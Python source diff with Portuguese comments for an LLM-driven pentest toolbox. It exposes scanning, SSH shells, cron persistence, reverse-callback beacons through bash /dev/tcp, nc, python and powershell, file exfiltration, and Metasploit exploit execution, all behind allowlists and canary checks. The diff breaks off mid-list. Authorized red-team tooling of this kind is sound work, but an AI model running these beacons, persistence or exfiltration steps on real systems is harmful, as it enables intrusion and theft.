@@ -1,0 +1,745 @@
+"""ToolBox: tools concretas do pentest, com guardrails e verificacao canario.
+
+E a unica porta de execucao real. Dois consumidores:
+  1. Orquestrador LLM (function calling) — o LLM decide COMO executar a acao
+     escolhida pela politica Red, chamando estas tools;
+  2. MCP server — expoe as mesmas tools para uso interativo/manual.
+
+Cada tool valida IP (allowlist CIDR), comando (denylist), registra evidencia
+em disco e so declara sucesso com verificacao executavel.
+"""
+from __future__ import annotations
+
+import hashlib
+import json
+import secrets
+import socket
+import subprocess
+import time
+from dataclasses import dataclass, field
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Callable
+
+from .fingerprint import HostScan, nmap_host_sweep, nmap_service_scan
+from .inventory import Inventory, SshCred
+from .safety import SafetyGate
+from .session import ChannelPool
+from .state import HostRecord, PentestState
+from .vuln_hints import hints_for
+
+CANARY_PREFIX = "PENTEST_CANARY_"
+
+
+@dataclass
+class ToolResult:
+    ok: bool
+    output: str
+    evidence: dict = field(default_factory=dict)
+    commands: list[str] = field(default_factory=list)
+
+
+class ToolBox:
+    def __init__(self, state: PentestState, inventory: Inventory,
+                 safety: SafetyGate, channels: ChannelPool,
+                 evidence_root: Path, dry_run: bool = False):
+        self.state = state
+        self.inv = inventory
+        self.safety = safety
+        self.channels = channels
+        self.evidence_root = evidence_root
+        self.dry_run = dry_run
+        self.command_log: list[str] = []
+        # probes de rede (http_probe/net_probe) NAO consomem o budget de
+        # comandos shell por passo — a iteracao de hipoteses precisa deles
+        self.probe_log: list[str] = []
+        # manifesto de evidencias: todo artefato gravado em disco entra aqui
+        # com sha256 — a auditoria pos-run re-verifica arquivo por arquivo
+        self.evidence_manifest: list[dict] = []
+        # canaries verificados neste passo (resetado pelo harness a cada step)
+        self.step_canaries: list[dict] = []
+        # rev11: contexto da cacada para a campanha .pt (tunel confirmado,
+        # creds descobertas com proveniencia) — injetado pelo pilot
+        self.hunt_context: dict = {}
+
+    def _log_probe(self, desc: str) -> None:
+        self.probe_log.append(desc)
+
+    # ------------------------------------------------------------ infra
+    def _ev_dir(self, label: str) -> Path:
+        d = self.evidence_root / f"step{self.state.step:03d}_{label}"
+        d.mkdir(parents=True, exist_ok=True)
+        return d
+
+    def _rel_to_run(self, p: Path) -> str:
+        """Caminho do artefato RELATIVO a run_dir (auditoria resolve contra ela)."""
+        try:
+            return str(p.resolve().relative_to(self.evidence_root.parent.resolve()))
+        except ValueError:
+            return str(p)
+
+    def _save_evidence(self, label: str, filename: str, content: str) -> dict:
+        """Grava artefato de evidencia com hash no manifesto (auditoria)."""
+        d = self._ev_dir(label)
+        p = d / filename
+        p.write_text(content, encoding="utf-8")
+        entry = {
+            "step": self.state.step, "tool": label,
+            "file": self._rel_to_run(p),
+            "sha256": hashlib.sha256(content.encode("utf-8")).hexdigest(),
+            "bytes": len(content.encode("utf-8")),
+            "ts": datetime.now(timezone.utc).isoformat(),
+        }
+        self.evidence_manifest.append(entry)
+        return entry
+
+    def _local_source_ip(self, target_ip: str) -> str | None:
+        """IP local (vista da rede do alvo) para o listener C2 escutar/avisar.
+
+        rev13: UDP connect NAO envia pacote (so consulta a tabela de rotas
+        do SO) — serve para alvo de qualquer superficie, inclusive sem :22
+        aberta; a porta usada (9/discard) e irrelevante."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect((target_ip, 9))  # discard; connect UDP e local-only
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except OSError:
+            return None
+
+    def _sleep_budgeted(self, seconds: float) -> None:
+        """Sleep em fatias respeitando o budget wall-clock do safety gate."""
+        end = time.monotonic() + seconds
+        while time.monotonic() < end:
+            self.safety.check_wall_clock()
+            time.sleep(min(5.0, end - time.monotonic()))
+
+    def _log_cmd(self, cmd: list[str] | str) -> None:
+        text = " ".join(cmd) if isinstance(cmd, list) else cmd
+        self.safety.check_command(text)
+        self.command_log.append(text)
+
+    def _ip(self, ip: str) -> None:
+        self.safety.ip_allowed(ip)
+
+    def _active_channel_for(self, ip: str):
+        """Canal SSH ativo para o ip (credencial que ja funcionou)."""
+        for (cip, _key), ch in self.channels._ssh.items():
+            if cip == ip and ch._master_ready:
+                return ch
+        return None
+
+    # ------------------------------------------------------------ tools
+    def tool_get_state(self) -> dict:
+        """Estado atual do pentest: hosts, status kill chain, acoes validas."""
+        hosts = [
+            {
+                "host_id": h.host_id, "ip": h.ip,
+                "status": int(h.status),
+                "vuln": h.vuln,
+                "services": {str(p): s.banner() for p, s in h.services.items()},
+                "root_verified": h.root_verified,
+                "user_verified": h.user_verified,
+                "exploit_attempts": h.exploit_attempts,
+            }
+            for h in self.state.hosts
+        ]
+        return {
+            "ok": True,
+            "step": self.state.step,
+            "n_hosts": self.state.n_hosts,
+            "chain_depth": self.state.chain_depth(),
+            "hosts": hosts,
+            "c2_hosts": sorted(self.state.c2_ids()),
+            # contexto para o orquestrador LLM: credenciais AUTORIZADAS do
+            # inventario (ssh_login rejeita qualquer outra), crown jewel e
+            # listener C2 — o LLM nunca precisa inventar nada disso
+            "ssh_creds_disponiveis": [
+                {"username": c.username, "password": c.password,
+                 "key_path": c.key_path, "port": c.port}
+                for c in self.inv.ssh_creds
+            ],
+            "canais_verificados": self.channels.active_hosts(),
+            "crown_jewel_path": self.inv.crown_jewel_path,
+            "c2_listener": {"host": self.inv.listener_host,
+                            "port": self.inv.listener_port},
+            "cred_attack_habilitado": bool(getattr(self.inv, "bruteforce", None)
+                                           and self.inv.bruteforce.enabled),
+            "hunt_context": self.hunt_context or None,
+        }
+
+    def tool_get_vuln_hints(self, host_ip: str) -> dict:
+        """Hints de exploracao para os servicos do host (contexto p/ decisao)."""
+        self._ip(host_ip)
+        rec = self.state.hosts[self.state.ip_to_id[host_ip]] if host_ip in self.state.ip_to_id else None
+        if rec is None:
+            return {"ok": False, "error": "host nao descoberto"}
+        return {"ok": True, "hints": hints_for(list(rec.services.values()))}
+
+    def tool_ping_sweep(self, subnet: str | None = None) -> dict:
+        """T1018: descobre hosts vivos na subnet (nmap -sn)."""
+        subnet = subnet or self.inv.seed_host_subnet or f"{self.state.hosts[0].ip}/32"
+        self._log_cmd(["nmap", "-sn", subnet])
+        if self.dry_run:
+            return {"ok": True, "dry_run": True, "command": f"nmap -sn {subnet}"}
+        ev = self._ev_dir("T1018_sweep")
+        xml = ev / "sweep.xml"
+        scans = nmap_host_sweep(subnet, xml)
+        if xml.exists():
+            self.evidence_manifest.append({
+                "step": self.state.step, "tool": "T1018_sweep",
+                "file": self._rel_to_run(xml),
+                "sha256": sha256_file(xml), "bytes": xml.stat().st_size,
+                "ts": datetime.now(timezone.utc).isoformat(),
+            })
+        found = []
+        for ip, hs in scans.items():
+            if not self.inv.ip_allowed(ip):
+                continue
+            rec = self.state.add_host(ip, subnet=0, hostname=hs.hostname)
+            self.state.register_edge(self.state.hosts[0].ip, ip)
+            found.append({"ip": ip, "hostname": hs.hostname, "host_id": rec.host_id})
+        return {"ok": True, "found_hosts": found, "xml": str(xml)}
+
+    def tool_service_scan(self, host_ip: str, extra_args: list[str] | None = None,
+                          timeout: int = 300) -> dict:
+        """T1046: enumeracao de servicos (nmap -sV). extra_args refinam (ex: -p 21-1000)."""
+        self._ip(host_ip)
+        self._log_cmd(["nmap", "-sV"] + (extra_args or []) + [host_ip])
+        if self.dry_run:
+            return {"ok": True, "dry_run": True,
+                    "command": f"nmap -sV {' '.join(extra_args or [])} {host_ip}"}
+        ev = self._ev_dir("T1046_scan")
+        xml = ev / f"scan_{host_ip.replace('.', '_')}_{len(self.command_log):04d}.xml"
+        hs: HostScan | None = nmap_service_scan(host_ip, xml, timeout=timeout,
+                                                extra_args=extra_args)
+        if hs is None:
+            return {"ok": False, "error": "nmap falhou"}
+        rec = self.state.ip_to_id.get(host_ip)
+        if rec is None:
+            return {"ok": False, "error": "host nao descoberto"}
+        h = self.state.hosts[rec]
+        h.services = hs.services
+        h.vuln = hs.vuln
+        if h.status == 0 and hs.services:  # CLEAN -> SCANNED
+            h.status = 1
+        if xml.exists():
+            self.evidence_manifest.append({
+                "step": self.state.step, "tool": "T1046_scan",
+                "file": self._rel_to_run(xml),
+                "sha256": sha256_file(xml), "bytes": xml.stat().st_size,
+                "ts": datetime.now(timezone.utc).isoformat(),
+            })
+        return {
+            "ok": True,
+            "services": {str(p): s.banner() for p, s in hs.services.items()},
+            "os_guess": hs.os_guess,
+            "vuln_score": hs.vuln,
+            "hints": hints_for(list(hs.services.values())),
+            "xml": str(xml),
+        }
+
+    def _cred_autorizada(self, username: str, password: str | None,
+                         key_path: str | None, port: int) -> bool:
+        """Credencial precisa constar no inventario (ou override da CLI)."""
+        for c in self.inv.ssh_creds:
+            if (c.username == username
+                    and (c.password or None) == (password or None)
+                    and (c.key_path or None) == (key_path or None)
+                    and int(c.port) == int(port)):
+                return True
+        return False
+
+    def tool_ssh_login(self, host_ip: str, username: str, password: str | None = None,
+                       key_path: str | None = None, port: int = 22,
+                       via_proxy: str | None = None) -> dict:
+        """Estabelece shell no host com credencial dada. Sucesso = canario volta.
+        via_proxy 'host:port' (rev10): SSH via proxy HTTP CONNECT
+        (ex. tunel Squid para SSH firewalled).
+
+        Gate de auditoria: a credencial TEM que vir do inventario declarado —
+        o LLM nao pode improvisar usuarios/senhas fora do autorizado.
+        """
+        self._ip(host_ip)
+        if not self._cred_autorizada(username, password, key_path, port):
+            disp = [c.username for c in self.inv.ssh_creds]
+            return {"ok": False, "verified": False,
+                    "error": f"credencial fora do inventario "
+                             f"(user={username!r}); disponiveis: {disp}"}
+        cred = SshCred(username=username, password=password, key_path=key_path,
+                       port=port, proxy=via_proxy)
+        token = CANARY_PREFIX + secrets.token_hex(8)
+        probe = f"echo {token}"
+        self._log_cmd(f"ssh {username}@{host_ip}:{port} [probe canario]")
+        if self.dry_run:
+            return {"ok": True, "dry_run": True, "command": f"ssh {username}@{host_ip} -p {port}"}
+        ch = self.channels.ssh(host_ip, cred)
+        rc, out = ch.run(probe, timeout=self.inv.ssh_connect_timeout + 10)
+        ev = self._save_evidence("ssh_login", "canary.txt", out)
+        verified = token in out
+        if verified:
+            rec = self.state.hosts[self.state.ip_to_id[host_ip]]
+            rec.user_verified = True
+            if rec.status < 2:
+                rec.status = 2  # EXPLOITED_USER (verificado)
+        self.step_canaries.append({
+            "kind": "ssh", "token": token, "evidence": ev["file"],
+            "sha256": ev["sha256"], "verified": verified,
+        })
+        return {"ok": verified, "rc": rc, "verified": verified,
+                "whoami_output": out.strip()[:400], "evidence": ev["file"]}
+
+    def tool_remote_exec(self, host_ip: str, command: str, timeout: int = 60) -> dict:
+        """Executa comando via canal SSH JA estabelecido (verificado por canario)."""
+        self._ip(host_ip)
+        self._log_cmd(command)
+        ch = self._active_channel_for(host_ip)
+        if ch is None:
+            return {"ok": False, "error": "sem canal SSH verificado para este host"}
+        if self.dry_run:
+            return {"ok": True, "dry_run": True, "command": command}
+        rc, out = ch.run(command, timeout=timeout)
+        safe = command[:40].replace(" ", "_").replace("/", "_") or "cmd"
+        ev = self._save_evidence("remote_exec", f"{safe}.txt", out)
+        return {"ok": rc == 0, "rc": rc, "output": out[:4000],
+                "evidence": ev["file"]}
+
+    def tool_check_root(self, host_ip: str) -> dict:
+        """Verifica privilege escalation: id -u == 0 pelo canal ativo."""
+        self._ip(host_ip)
+        ch = self._active_channel_for(host_ip)
+        if ch is None:
+            return {"ok": False, "error": "sem canal SSH"}
+        rc, out = ch.run("id -u", timeout=15)
+        ev = self._save_evidence("check_root", "id_u.txt", out)
+        verified = rc == 0 and out.strip() == "0"
+        if verified:
+            rec = self.state.hosts[self.state.ip_to_id[host_ip]]
+            rec.root_verified = True
+            if rec.status < 3:
+                rec.status = 3  # EXPLOITED_ROOT (verificado)
+        self.step_canaries.append({
+            "kind": "root", "evidence": ev["file"], "sha256": ev["sha256"],
+            "verified": verified,
+        })
+        return {"ok": verified, "id_u": out.strip(), "evidence": ev["file"]}
+
+    def tool_read_file(self, host_ip: str, path: str) -> dict:
+        """Le arquivo do alvo pelo canal ativo (ex: /etc/shadow com root)."""
+        self._ip(host_ip)
+        self._log_cmd(f"cat {path}")
+        ch = self._active_channel_for(host_ip)
+        if ch is None:
+            return {"ok": False, "error": "sem canal SSH"}
+        if self.dry_run:
+            return {"ok": True, "dry_run": True, "command": f"cat {path}"}
+        rc, out = ch.run(f"cat {path}", timeout=30)
+        safe = path.strip("/").replace("/", "_") or "arquivo"
+        ev = self._save_evidence("read_file", f"{safe}.txt", out)
+        return {"ok": rc == 0, "content": out[:8000], "evidence": ev["file"]}
+
+    # -------------------------------------------------- cadeia profunda
+    def tool_persist_backdoor(self, host_ip: str) -> dict:
+        """T1053: instala backdoor VERIFICAVEL via cron com token exclusivo.
+
+        Instala linha de cron que grava o token em log a cada minuto e
+        aguarda o disparo autonomo (~70s): so entao o status avanca para
+        BACKDOORED — a persistencia provou que funciona sozinha, sem o
+        canal atual. Cleanup remove a linha (token marcado no grep).
+        """
+        self._ip(host_ip)
+        ch = self._active_channel_for(host_ip)
+        if ch is None:
+            return {"ok": False, "verified": False,
+                    "error": "sem canal SSH verificado para este host"}
+        token = CANARY_PREFIX + secrets.token_hex(8)
+        marker = f".pentest_backdoor_{token[len(CANARY_PREFIX):]}.log"
+        linha = f"echo {token} >> $HOME/{marker}"
+        self._log_cmd(f"crontab: +{linha} @ {host_ip} [T1053 backdoor canario]")
+        if self.dry_run:
+            return {"ok": True, "dry_run": True, "token": token,
+                    "command": f"(crontab -l; echo '* * * * * {linha}') | crontab -"}
+        rc_install, out_install = ch.run(
+            f"(crontab -l 2>/dev/null | grep -v {CANARY_PREFIX}; "
+            f"echo '* * * * * {linha}') | crontab -", timeout=30)
+        ev_i = self._save_evidence("persist_backdoor", "install.txt",
+                                   out_install or "(sem saida)")
+        self._sleep_budgeted(70)  # cron dispara a cada 1 min
+        rc_check, out_check = ch.run(f"cat $HOME/{marker}", timeout=30)
+        ev_c = self._save_evidence("persist_backdoor", "verify.txt", out_check)
+        verified = rc_install == 0 and token in out_check
+        if verified:
+            rec = self.state.hosts[self.state.ip_to_id[host_ip]]
+            if rec.status < 4:
+                rec.status = 4  # BACKDOORED (verificado)
+        self.step_canaries.append({
+            "kind": "backdoor", "token": token, "evidence": ev_c["file"],
+            "sha256": ev_c["sha256"], "verified": verified,
+        })
+        return {"ok": verified, "verified": verified, "token": token,
+                "install_rc": rc_install, "check_rc": rc_check,
+                "evidence": ev_c["file"],
+                "cleanup_hint": f"crontab -l | grep -v {CANARY_PREFIX} | crontab -; rm -f $HOME/{marker}"}
+
+    def tool_c2_callback(self, host_ip: str) -> dict:
+        """T1071: dispara callback do alvo ao listener C2 com token exclusivo.
+
+        O canal SSH executa um beacon /dev/tcp (bash) ao listener local; o
+        callback so e VERIFICADO quando o token chega ao socket — prova a
+        rota de rede e execucao de codigo no sentido alvo->atacante.
+        """
+        self._ip(host_ip)
+        ch = self._active_channel_for(host_ip)
+        if ch is None:
+            return {"ok": False, "verified": False,
+                    "error": "sem canal SSH verificado para este host"}
+        src_ip = self._local_source_ip(host_ip)
+        if src_ip is None:
+            return {"ok": False, "verified": False,
+                    "error": "nao foi possivel determinar o IP de origem do listener"}
+        listener = self.channels.ensure_listener()
+        if listener.sock is None:
+            return {"ok": False, "verified": False,
+                    "error": f"listener C2 nao abriu em {self.inv.listener_port}/tcp"}
+        token = CANARY_PREFIX + secrets.token_hex(8)
+        port = self.inv.listener_port
+        # rev13: CADEIA DE FALLBACK — antes soh bash /dev/tcp: alvo sem
+        # bash (appliance, busybox minima, Windows) falhava SILENCIOSAMENTE
+        # e a prova OOB (confirmed) se perdia como suspect. Cada variante
+        # abaixo e inofensiva e independente; a que existir no alvo entrega
+        # o token ao listener. Todas sao sh-validas isoladamente (erro em
+        # uma nao derruba as demais; '|| true' isola cada segmento).
+        beacons = [
+            f"timeout 8 bash -c 'exec 3<>/dev/tcp/{src_ip}/{port}; "
+            f"echo {token} >&3' 2>/dev/null || true",
+            f"timeout 8 sh -c \"echo {token} | nc -w 5 {src_ip} {port}\" "
+            f"2>/dev/null || true",
+            f"timeout 8 python3 -c \"import socket;"
+            f"s=socket.create_connection(('{src_ip}',{port}),5);"
+            f"s.send(b'{token}')\" 2>/dev/null || true",
+            f"timeout 8 powershell -NoProfile -Command \"(New-Object "
+            f"Net.Sockets.TCPClient('{src_ip}',{port})).GetStream()."
+            f"Write([Text.Encoding]::ASCII.GetBytes('{token}'),0,"
+            f"{len(token)})\" 2>/dev/null || true",
+        ]
+        beacon = " ; ".join(beacons)
+        self._log_cmd(f"c2 beacon {host_ip} -> {src_ip}:{port} [token canario; "
+                      f"cadeia bash/nc/python3/powershell]")
+        if self.dry_run:
+            return {"ok": True, "dry_run": True, "token": token, "beacon": beacon}
+        import threading
+        t = threading.Thread(
+            target=ch.run, args=(beacon,), kwargs={"timeout": 20}, daemon=True)
+        t.start()
+        res = listener.wait_for_token(token, wait_seconds=self.inv.c2_callback_wait)
+        ev = self._save_evidence("c2_callback", "listener.log", res["log"])
+        t.join(timeout=5)
+        if res["verified"]:
+            rec = self.state.hosts[self.state.ip_to_id[host_ip]]
+            self.state.c2_hosts.add(rec.host_id)
+        self.step_canaries.append({
+            "kind": "c2", "token": token, "evidence": ev["file"],
+            "sha256": ev["sha256"], "verified": res["verified"],
+        })
+        return {"ok": res["verified"], "verified": res["verified"],
+                "peer": res["peer"], "listener": f"{src_ip}:{port}",
+                "evidence": ev["file"]}
+
+    def tool_exfiltrate(self, host_ip: str, path: str | None = None) -> dict:
+        """T1041: exfiltra o crown jewel pelo canal verificado.
+
+        O conteudo sai do alvo pelo canal SSH (isso E a exfiltracao) e e
+        gravado localmente com sha256 — verificado quando ha >= min_bytes.
+        Status avanca para EXFILTRATED e encerra a kill chain.
+        """
+        self._ip(host_ip)
+        ch = self._active_channel_for(host_ip)
+        if ch is None:
+            return {"ok": False, "verified": False,
+                    "error": "sem canal SSH verificado para este host"}
+        alvo = path or self.inv.crown_jewel_path or "/etc/hostname"
+        self._log_cmd(f"cat {alvo} [exfil T1041]")
+        if self.dry_run:
+            return {"ok": True, "dry_run": True, "path": alvo}
+        rc, out = ch.run(f"cat {alvo}", timeout=30)
+        sha = hashlib.sha256(out.encode("utf-8")).hexdigest()
+        safe = alvo.strip("/").replace("/", "_") or "crown"
+        ev = self._save_evidence("exfiltrate", f"{safe}_{sha[:8]}.txt", out)
+        nbytes = len(out.encode("utf-8"))
+        verified = rc == 0 and nbytes >= self.inv.crown_jewel_min_bytes
+        if verified:
+            rec = self.state.hosts[self.state.ip_to_id[host_ip]]
+            self.state.exfil_verified = True
+            self.state.crown_jewel_sha256 = sha
+            if rec.status < 5:
+                rec.status = 5  # EXFILTRATED (verificado)
+        self.step_canaries.append({
+            "kind": "exfil", "sha256": sha, "evidence": ev["file"],
+            "verified": verified, "bytes": nbytes,
+        })
+        return {"ok": verified, "verified": verified, "path": alvo,
+                "bytes": nbytes, "sha256": sha, "content": out[:400],
+                "evidence": ev["file"]}
+
+    # ------------------------------------------------ arsenal (sub-TTPs)
+    def tool_vuln_scan(self, host_ip: str) -> dict:
+        """T1595.002: nmap NSE (vuln/vulners) nas portas ja conhecidas."""
+        from .arsenal import vuln_scan
+        return vuln_scan(self, host_ip)
+
+    def tool_web_discover(self, host_ip: str, port: int = 80) -> dict:
+        """T1580: recon web passivo (paths comuns, tech, endpoints)."""
+        from .arsenal import web_discover
+        return web_discover(self, host_ip, port)
+
+    def tool_http_probe(self, host_ip: str, port: int = 80,
+                        method: str = "GET", path: str = "/",
+                        headers: dict | None = None, body: str | None = None,
+                        timeout: int = 10, oob_wait: int = 0) -> dict:
+        """T1190 (0-day hunt): requisicao HTTP ARBITRARIA com resposta
+        completa e canario out-of-band opcional (callback ao listener)."""
+        from .arsenal import http_probe
+        return http_probe(self, host_ip, port, method=method, path=path,
+                          headers=headers, body=body, timeout=timeout,
+                          oob_wait=oob_wait)
+
+    def tool_net_probe(self, host_ip: str, port: int, proto: str = "tcp",
+                       send_hex: str | None = None, send_text: str | None = None,
+                       read_timeout: float = 5.0, oob_wait: int = 0) -> dict:
+        """T1095 (universal): interacao RAW TCP/UDP — bytes arbitrarios para
+        QUALQUER protocolo, com canario out-of-band opcional."""
+        from .arsenal import net_probe
+        return net_probe(self, host_ip, port, proto=proto, send_hex=send_hex,
+                         send_text=send_text, read_timeout=read_timeout,
+                         oob_wait=oob_wait)
+
+    def tool_run_command(self, command: str, timeout: int = 120) -> dict:
+        """T1059: comando ARBITRARIO do arsenal (allowlist de binarios +
+        denylist + budget + evidencia com sha256) — componha qualquer TTP."""
+        from .arsenal import run_command
+        return run_command(self, command, timeout=timeout)
+
+    def tool_exploit_search(self, cve: str | None = None,
+                            termo: str | None = None,
+                            nmap_xml: str | None = None,
+                            online: bool = False) -> dict:
+        """T1595.002: busca de exploits REAIS — feed CVE LOCAL + searchsploit
+        (Exploit-DB) + GitHub (se online). Devolve PoCs/exploits conhecidos
+        com evidencia; use ANTES de formular hipoteses (o que ja existe
+        publicamente muda o plano de cacada)."""
+        from .exploit_search import exploit_search
+        return exploit_search(self, cve=cve, termo=termo,
+                              nmap_xml=nmap_xml, online=online)
+
+    def tool_exploit_execute(self, cve_id: str, host_ip: str, port: int = 0) -> dict:
+        """
+        EXECUTA exploit REAL via Metasploit contra CVE identificado.
+        T1190 / T1190.001 - Validação real: obtém shell/root ou descarta.
+        """
+        from .exploit_execute import tool_exploit_execute
+        return tool_exploit_execute(self, cve_id=cve_id, host_ip=host_ip)
+
+    def tool_cve_lookup(self, cve_id: str) -> dict:
+        """T1592: consulta a CVE no ESPELHO LOCAL do feed (offline,
+        reprodutivel): resumo, versoes afetadas, referencias."""
+        from .cve_feed import DEFAULT_DIR, lookup
+        self._log_probe(f"cve_lookup {cve_id}")
+        try:
+            r = lookup(cve_id, DEFAULT_DIR)
+        except SystemExit as e:
+            return {"ok": False, "error": str(e)}
+        r.setdefault("ok", True)
+        return r
+
+    def tool_privesc_scan(self, host_ip: str) -> dict:
+        """T1548/T1068: enum de superficie de escalada (sudo/SUID/caps/cron)."""
+        from .arsenal import privesc_scan
+        return privesc_scan(self, host_ip)
+
+    def tool_persist_ssh_key(self, host_ip: str) -> dict:
+        """T1098.004: chave SSH autorizada com marker, verificada por reconexao."""
+        from .arsenal import persist_ssh_key
+        return persist_ssh_key(self, host_ip)
+
+    def tool_cred_attack(self, host_ip: str, service: str = "ssh") -> dict:
+        """T1110.001: password spray DECLARADO no inventario (opt-in, bounded)."""
+        from .arsenal import cred_attack
+        return cred_attack(self, host_ip, service)
+
+    # -------------------------------------------------------- schema LLM
+    def llm_tool_schemas(self) -> list[dict]:
+        """Schemas function-calling para o orquestrador LLM."""
+        return [
+            {"type": "function", "function": {
+                "name": "get_state", "description": "Estado do pentest: hosts, status, cadeia",
+                "parameters": {"type": "object", "properties": {}, "required": []}}},
+            {"type": "function", "function": {
+                "name": "get_vuln_hints", "description": "Hints de exploracao dos servicos do host",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}}, "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "ping_sweep", "description": "T1018: descobre hosts vivos na subnet",
+                "parameters": {"type": "object", "properties": {
+                    "subnet": {"type": "string", "description": "CIDR, ex 192.168.1.0/24"}},
+                    "required": []}}},
+            {"type": "function", "function": {
+                "name": "service_scan", "description": "T1046: enumera servicos de um host",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"},
+                    "extra_args": {"type": "array", "items": {"type": "string"},
+                                    "description": "flags nmap adicionais, ex ['-p','21-1000']"}},
+                    "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "vuln_scan", "description": "T1595.002: nmap NSE (vuln/vulners) nas portas ja conhecidas do host",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}}, "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "web_discover", "description": "T1580: recon web passivo — GET em paths comuns + deteccao de ANOMALIAS (catch-all, reflexao de template, stack traces) que indicam onde cavar",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"},
+                    "port": {"type": "integer", "default": 80}},
+                    "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "http_probe", "description": "T1190 (0-day hunt): requisicao HTTP ARBITRARIA — metodo, path, headers e body livres; retorna resposta COMPLETA (status/headers/corpo/timing). Com oob_wait>0 injeta canario out-of-band e espera callback (detecta SSRF/blind). Use para TESTAR hipoteses a partir das anomalias do web_discover",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"},
+                    "port": {"type": "integer", "default": 80},
+                    "method": {"type": "string", "default": "GET"},
+                    "path": {"type": "string", "default": "/"},
+                    "headers": {"type": "object"},
+                    "body": {"type": "string"},
+                    "timeout": {"type": "integer", "default": 10},
+                    "oob_wait": {"type": "integer", "default": 0,
+                                 "description": "segundos esperando callback canario (0 = nao espera)"}},
+                    "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "net_probe", "description": "T1095 (UNIVERSAL): interacao RAW TCP/UDP — conecta e envia bytes arbitrarios (send_hex OU send_text), le a resposta bruta. Serve para QUALQUER protocolo: FTP, SMTP, DNS, Redis, SMB, RTSP, VNC, telnet, SCADA e protocolos sem nome. oob_wait>0 injeta canario out-of-band na carga e espera callback",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"},
+                    "port": {"type": "integer"},
+                    "proto": {"type": "string", "default": "tcp"},
+                    "send_hex": {"type": "string", "description": "payload em hex, ex '414243'"},
+                    "send_text": {"type": "string", "description": "payload em texto, ex 'USER admin\\r\\nPASS x\\r\\n'"},
+                    "read_timeout": {"type": "number", "default": 5},
+                    "oob_wait": {"type": "integer", "default": 0}},
+                    "required": ["host_ip", "port"]}}},
+            {"type": "function", "function": {
+                "name": "run_command", "description": "T1059: executa comando ARBITRARIO do arsenal de pentest (nmap, ffuf, gobuster, redis-cli, smbclient, snmpwalk, hydra, dig, curl, nuclei... ~45 binarios) com stdout/stderr COMPLETOS como evidencia. Para compor TTPs que nao existem como tool pronta",
+                "parameters": {"type": "object", "properties": {
+                    "command": {"type": "string", "description": "linha de comando completa, ex 'nmap --script smb-vuln* -p 139,445 192.168.10.14'"},
+                    "timeout": {"type": "integer", "default": 120}},
+                    "required": ["command"]}}},
+            {"type": "function", "function": {
+                "name": "exploit_search", "description": "T1595.002: busca exploits REAIS para o alvo — feed CVE LOCAL (resumo/versoes afetadas) + searchsploit (Exploit-DB local, por termo/CVE/nmap.xml) + repos GitHub de PoC (se online=true). USE ANTES DE FORMULAR HIPOTESES: o que ja e publico muda o plano",
+                "parameters": {"type": "object", "properties": {
+                    "cve": {"type": "string", "description": "CVE completa, ex CVE-2024-6387"},
+                    "termo": {"type": "string", "description": "termo searchsploit, ex 'redis 6' ou 'apache 2.0'"},
+                    "nmap_xml": {"type": "string", "description": "caminho de XML do nmap para searchsploit --nmap"},
+                    "online": {"type": "boolean", "default": False,
+                               "description": "true inclui busca GitHub (rede)"}},
+                    "required": []}}},
+            {"type": "function", "function": {
+                "name": "exploit_execute", "description": "T1190: EXECUTA exploit REAL via Metasploit contra CVE identificada. Valida com canario: se obtiver shell/root = SHELL_OBTAINED confirmado. Se nao abrir session = descartado.",
+                "parameters": {"type": "object", "properties": {
+                    "cve_id": {"type": "string", "description": "CVE-ID completa, ex CVE-2024-6387"},
+                    "host_ip": {"type": "string", "description": "IP do alvo"},
+                    "port": {"type": "integer", "default": 0,
+                              "description": "porta do servico (0 = auto-detecta)"}},
+                    "required": ["cve_id", "host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "cve_lookup", "description": "T1592: consulta CVE no ESPELHO LOCAL do feed (offline/reprodutivel): resumo, produto/versoes afetadas, referencias oficiais",
+                "parameters": {"type": "object", "properties": {
+                    "cve_id": {"type": "string", "description": "ex CVE-2022-0543"}},
+                    "required": ["cve_id"]}}},
+            {"type": "function", "function": {
+                "name": "ssh_login", "description": "T1078: obtem shell com credencial DO INVENTARIO (verificado por canario)",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}, "username": {"type": "string"},
+                    "password": {"type": "string"}, "key_path": {"type": "string"},
+                    "port": {"type": "integer", "default": 22}},
+                    "required": ["host_ip", "username"]}}},
+            {"type": "function", "function": {
+                "name": "cred_attack", "description": "T1110.001: testa combinacoes DECLARADAS no inventario (opt-in bruteforce.enabled; bounded)",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"},
+                    "service": {"type": "string", "default": "ssh"}},
+                    "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "remote_exec", "description": "Executa comando no host via canal verificado",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}, "command": {"type": "string"},
+                    "timeout": {"type": "integer", "default": 60}},
+                    "required": ["host_ip", "command"]}}},
+            {"type": "function", "function": {
+                "name": "check_root", "description": "T1068: verifica se o canal ativo roda como root (id -u == 0)",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}}, "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "privesc_scan", "description": "T1548: enum de superficie de escalada pelo canal (sudo -l, SUID, capabilities, cron gravavel, kernel) com sugestoes",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}}, "required": ["host_ip"]}}},
+            {"type": "function", "function": {
+                "name": "read_file", "description": "Le arquivo do alvo pelo canal ativo",
+                "parameters": {"type": "object", "properties": {
+                    "host_ip": {"type": "string"}, "path": {"type": "string"}},
+                    "required": ["host_ip", "path"]}}},
+            {"type": "function", "function": {
